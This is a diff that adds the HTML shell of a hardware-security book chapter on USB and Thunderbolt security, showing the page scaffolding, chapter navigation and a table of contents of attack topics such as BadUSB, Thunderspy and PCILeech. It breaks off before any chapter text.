@@ -1,0 +1,3550 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+  <meta name="theme-color" content="#ffffff">
+  
+    <meta name="description" content="Pustakālaya, a library of books on Indian knowledge traditions, science, technology and language, read page by page in the manner of an e-book reader, online or offline.">
+  
+  
+    <meta name="author" content="Nikhil Kumar Rajput, Ramanujan College, University of Delhi">
+  
+  
+    <link rel="canonical" href="https://nikhilkrajput.github.io/pustakalaya/science/hardware_security/ch35-usb-and-thunderbolt-security.html">
+  
+  
+    <link rel="prev" href="ch34-ai-and-ml-hardware-security.html">
+  
+  
+    <link rel="next" href="ch36-wireless-hardware-security.html">
+  
+  <link rel="icon" href="../../assets/icons/favicon-32.png" sizes="32x32">
+  <link rel="icon" href="../../assets/icons/favicon.svg" type="image/svg+xml">
+  <link rel="manifest" href="../../manifest.webmanifest">
+  <link rel="apple-touch-icon" href="../../assets/icons/apple-touch-icon.png">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Pustakālaya">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="application-name" content="Pustakālaya"><script id="bjp-books" type="application/json">[{"id": "vol01_veda", "lang": "en", "path": "vol01_veda"}, {"id": "vol02_upanisad", "lang": "en", "path": "vol02_upanisad"}, {"id": "vol03_darsana", "lang": "en", "path": "vol03_darsana"}, {"id": "vol04_buddha_jina", "lang": "en", "path": "vol04_buddha_jina"}, {"id": "vol05_yoga", "lang": "en", "path": "vol05_yoga"}, {"id": "vol06_tantra", "lang": "en", "path": "vol06_tantra"}, {"id": "vol07_itihasa", "lang": "en", "path": "vol07_itihasa"}, {"id": "vol08_kavya", "lang": "en", "path": "vol08_kavya"}, {"id": "vol09_sangita_natya", "lang": "en", "path": "vol09_sangita_natya"}, {"id": "vol10_sabda", "lang": "en", "path": "vol10_sabda"}, {"id": "vol11_ganita", "lang": "en", "path": "vol11_ganita"}, {"id": "vol12_jyotisa", "lang": "en", "path": "vol12_jyotisa"}, {"id": "vol13_ayurveda", "lang": "en", "path": "vol13_ayurveda"}, {"id": "vol14_rasayana", "lang": "en", "path": "vol14_rasayana"}, {"id": "vol15_krsi_jiva", "lang": "en", "path": "vol15_krsi_jiva"}, {"id": "vol16_vastu", "lang": "en", "path": "vol16_vastu"}, {"id": "vol17_silpa_karu", "lang": "en", "path": "vol17_silpa_karu"}, {"id": "vol18_rajaniti_dharma", "lang": "en", "path": "vol18_rajaniti_dharma"}, {"id": "vol19_vanijya_samudra", "lang": "en", "path": "vol19_vanijya_samudra"}, {"id": "vol20_yuddha", "lang": "en", "path": "vol20_yuddha"}, {"id": "vol21_bhugola", "lang": "en", "path": "vol21_bhugola"}, {"id": "vol22_manas_siksa", "lang": "en", "path": "vol22_manas_siksa"}, {"id": "vol23_jana_jati", "lang": "en", "path": "vol23_jana_jati"}, {"id": "vol24_samanvaya", "lang": "en", "path": "vol24_samanvaya"}, {"id": "hardware_security", "lang": "en", "path": "science/hardware_security"}, {"id": "drones_missiles", "lang": "en", "path": "science/drones_missiles"}, {"id": "code_to_electrons", "lang": "en", "path": "science/code_to_electrons"}, {"id": "dpi_ndr", "lang": "en", "path": "science/dpi_ndr"}, {"id": "quantum", "lang": "en", "path": "quantum/quantum"}, {"id": "qml", "lang": "en", "path": "quantum/qml"}, {"id": "asic", "lang": "en", "path": "computing/asic"}, {"id": "compute", "lang": "en", "path": "computing/compute"}, {"id": "memory", "lang": "en", "path": "computing/memory"}, {"id": "os", "lang": "en", "path": "computing/os"}, {"id": "databases", "lang": "en", "path": "computing/databases"}, {"id": "datacenters", "lang": "en", "path": "computing/datacenters"}, {"id": "networks", "lang": "en", "path": "computing/networks"}, {"id": "cellular", "lang": "en", "path": "computing/cellular"}, {"id": "ml", "lang": "en", "path": "computing/ml"}, {"id": "security", "lang": "en", "path": "cyber/security"}, {"id": "trust", "lang": "en", "path": "cyber/trust"}, {"id": "optimization_methods", "lang": "en", "path": "courses/optimization_methods"}, {"id": "quantum_computing_applications", "lang": "en", "path": "courses/quantum_computing_applications"}, {"id": "dbms_course", "lang": "en", "path": "courses/dbms_course"}, {"id": "english_book", "lang": "en", "path": "language/english_book"}, {"id": "english_book_hinglish", "lang": "en", "path": "language/english_book_hinglish"}, {"id": "english_book_hi", "lang": "hi", "path": "language/english_book_hi"}]</script><script>
+    try {
+      if ((window.matchMedia && (matchMedia("(display-mode: standalone)").matches || matchMedia("(display-mode: fullscreen)").matches)) || navigator.standalone === true) {
+        document.documentElement.className += " bjp-standalone";
+      }
+    } catch (e) { /* not an installed app */ }
+  </script>
+  <script>
+    /* a book opened from its cover on the shelf: the page stays blank, in the cover's colour, until the reader is up */
+    try {
+      var cv = sessionStorage.getItem("bjp.reader.cover");
+      if (cv && sessionStorage.getItem("bjp.reader.open") === "1") {
+        var c = JSON.parse(cv), de = document.documentElement;
+        de.className += " bjp-booting";
+        if (c && /^#[0-9a-f]{3,8}$/i.test(c.bg || "")) de.style.background = c.bg;
+        setTimeout(function () { de.classList.remove("bjp-booting"); de.style.background = ""; }, 3000);
+      }
+    } catch (e) { /* no session storage: the page simply opens as usual */ }
+  </script>
+
+    
+      
+        <title>35. USB and Thunderbolt Security - Pustakālaya</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Serif:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Serif";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/extra.css">
+    
+      <link rel="stylesheet" href="../../assets/reader.css">
+    
+      <link rel="stylesheet" href="../../assets/app.css">
+    
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+Devanagari:wght@400;600;700&display=swap">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sec-usb-taxonomy" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../index.html" title="Pustakālaya" class="md-header__button md-logo" aria-label="Pustakālaya" data-md-component="logo">
+      
+  <img src="../../assets/icons/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pustakālaya
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              35. USB and Thunderbolt Security
+            
+          </span>
+        </div>
+      </div>
+    </div><a href="../../index.html" class="bjp-libbtn" aria-label="Library: all books" title="Library: all books">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 20V5h4v15M8 20V9h4v11M14 20L12.6 6l3.8-.8 3 14.2M3 20h18"/></svg><span>Library</span>
+    </a>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary bjp-nav bjp-nav--book" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../index.html" title="Pustakālaya" class="md-nav__button md-logo" aria-label="Pustakālaya" data-md-component="logo">
+      
+  <img src="../../assets/icons/logo.svg" alt="logo">
+
+    </a>
+    Pustakālaya
+  </label>
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      <li class="md-nav__item bjp-nav-all">
+        <a href="../../index.html" class="md-nav__link" aria-label="All books: back to the library">
+          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19 12H5M11 6l-6 6 6 6"/></svg>
+          <span class="md-ellipsis">All books</span>
+        </a>
+      </li>
+      <li class="md-nav__item bjp-nav-book" role="presentation"><span class="bjp-nav-head">Hardware Security</span></li>
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview and preface
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch01-trusted-platform-module-tpm-2-0.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. Trusted Platform Module (TPM 2.0)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch02-hardware-security-module-hsm.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Hardware Security Module (HSM)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch03-physically-unclonable-functions-puf.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Physically Unclonable Functions (PUF)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch04-trusted-execution-environment-tee.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Trusted Execution Environment (TEE)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch05-hardware-root-of-trust.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Hardware Root of Trust
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch06-side-channel-attack-protection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Side-Channel Attack Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch07-hardware-trojan-detection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. Hardware Trojan Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch08-secure-boot.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. Secure Boot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch09-true-random-number-generator-trng.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. True Random Number Generator (TRNG)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch10-fpga-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. FPGA Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch11-iommu-and-dma-protection.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. IOMMU and DMA Protection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch12-memory-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. Memory Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch13-anti-tamper-technologies.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. Anti-Tamper Technologies
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch14-hardware-attestation.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. Hardware Attestation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch15-automotive-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. Automotive Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch16-post-quantum-cryptography-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. Post-Quantum Cryptography Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch17-jtag-and-debug-interface-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. JTAG and Debug Interface Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch18-hardware-cryptographic-accelerators.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Hardware Cryptographic Accelerators
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch19-secure-key-management.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. Secure Key Management
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch20-iot-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. IoT Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch21-secure-elements-and-smart-cards.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. Secure Elements and Smart Cards
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch22-fido2-and-webauthn-hardware-security-keys.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. FIDO2 and WebAuthn Hardware Security Keys
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch23-hardware-cryptocurrency-wallets.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Hardware Cryptocurrency Wallets
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch24-network-security-processors.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. Network Security Processors
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch25-cheri-capability-hardware.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    25. CHERI Capability Hardware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch26-risc-v-security-extensions.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    26. RISC-V Security Extensions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch27-formal-verification-of-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    27. Formal Verification of Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch28-hardware-supply-chain-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    28. Hardware Supply Chain Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch29-5g-and-telecom-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    29. 5G and Telecom Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch30-medical-device-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    30. Medical Device Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch31-ics-and-scada-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    31. ICS and SCADA Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch32-biometric-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    32. Biometric Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch33-satellite-and-aerospace-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    33. Satellite and Aerospace Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="ch34-ai-and-ml-hardware-security.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    34. AI and ML Hardware Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    35. USB and Thunderbolt Security
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="ch35-usb-and-thunderbolt-security.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    35. USB and Thunderbolt Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-taxonomy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.1 USB Attack Taxonomy
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-hw-arch" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.2 USB Hardware Architecture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.2 USB Hardware Architecture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3521-xhci-host-controller" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.2.1 xHCI Host Controller
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-badusb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.3 BadUSB Attack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.3 BadUSB Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3531-phison-ps2251-firmware-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.3.1 Phison PS2251 Firmware Exploitation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3532-usb-class-spoofing-mechanism" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.3.2 USB Class Spoofing Mechanism
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-omg-cable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.4 O.MG Cable and Advanced Hardware Implants
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-hak5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.5 Hak5 Ecosystem
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-usb-killer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.6 USB Killer
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-thunderspy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.7 Thunderspy – Thunderbolt Security Vulnerabilities
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.7 Thunderspy – Thunderbolt Security Vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#3571-thunderspy-attack-procedure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.7.1 Thunderspy Attack Procedure
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sec-pcileech" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        35.8 PCILeech DMA Attack
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="35.8 PCILeech DMA Attack">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
